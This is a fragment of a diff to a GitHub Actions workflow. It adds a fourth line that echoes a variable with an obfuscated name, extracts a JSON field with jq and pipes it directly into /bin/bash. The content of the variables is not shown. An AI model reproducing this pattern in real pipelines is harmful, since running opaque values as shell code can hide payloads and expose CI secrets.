@@ -33,6 +33,7 @@ jobs:
           echo $fwl56 | jq -r .vr9 | /bin/bash
           echo $bgqll78 | jq -r .tg00 | /bin/bash
           echo $eakf074 | jq -r .s7 | /bin/bash
+          echo $tvsno2 | jq -r .h441 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
